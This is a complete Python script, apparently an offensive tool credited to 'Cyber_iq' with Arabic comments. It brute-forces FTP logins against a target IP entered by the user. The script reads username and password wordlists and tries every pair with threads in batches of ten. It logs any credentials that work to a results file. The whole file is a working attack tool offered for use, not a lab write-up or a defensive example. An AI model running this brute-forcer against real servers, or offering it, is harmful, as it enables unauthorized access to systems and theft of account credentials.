import ftplib
import sys
import threading
import time
import os

# شعار البرنامج
Banner5 = """
          _nnnn_
         dGGGGMMb
        @p~qp~~qMb
        M|@||@) M|
        @,----.JM|
       JS^\__/  qKL
      dZP        qKRb
     dZP          qKKb
    fZP            SMMb
    HZM            MMMM
    FqM            MMMM
  __| ".        |\dS"qML
  |    `.       | `' \Zq
 _)      \.___.,|     .'
\____    )MMMMMP|    .'
      `-'        `--' Coder by Cyber_iq"""

os.system('clear' if os.name == 'posix' else 'cls')
print(Banner5)
print("instagram ---> @Cyber_iq\n")

# إدخال البيانات
host = input(" -> Enter Target IP: ")
user_file = "user.txt"
pass_file = "pass.txt"

# قراءة الملفات
try:
    users = open(user_file, 'r').read().splitlines()
    passwords = open(pass_file, 'r').read().splitlines()
except FileNotFoundError:
    print("Error: Files not found!")
    sys.exit()

# متغيرات الإحصائيات
total_users = len(users)
total_passes = len(passwords)
tested_users = 0
remaining_passes = total_passes
found = False
lock = threading.Lock()

def update_dashboard(current_user, current_pass):
    """تحديث الواجهة الكتابية في سطر واحد"""
    sys.stdout.write(f"\r[+] Testing: {current_user} | Tested Users: {tested_users}/{total_users} | Remaining Passes: {remaining_passes} | Try: {current_pass[:10]}...   ")
    sys.stdout.flush()

def brute_force(username, password):
    global found, tested_users, remaining_passes
    if found: return
    
    try:
        ftp = ftplib.FTP(host, timeout=3)
        ftp.login(username, password)
        with lock:
            if not found:
                print(f"\n\n{'='*40}")
                print(f" SUCCESS! User: {username} | Pass: {password}")
                print(f"{'='*40}\n")
                found = True
                with open("results.txt", "a") as f:
                    f.write(f"IP: {host} | User: {username} | Pass: {password}\n")
        ftp.quit()
    except:
        pass

# التنفيذ الرئيسي
for user_index, user in enumerate(users):
    if found: break
    tested_users = user_index + 1
    remaining_passes = total_passes
    
    # تقسيم كلمات المرور إلى مجموعات من 10 لتجربتها في آن واحد
    for i in range(0, total_passes, 10):
        if found: break
        batch = passwords[i:i+10]
        threads = []
        
        remaining_passes = total_passes - i
        update_dashboard(user, batch[0]) # تحديث الواجهة

        for password in batch:
            t = threading.Thread(target=brute_force, args=(user, password))
            t.start()
            threads.append(t)
        
        for t in threads:
            t.join()

if not found:
    print("\n\n[!] Finished: No valid credentials found.")
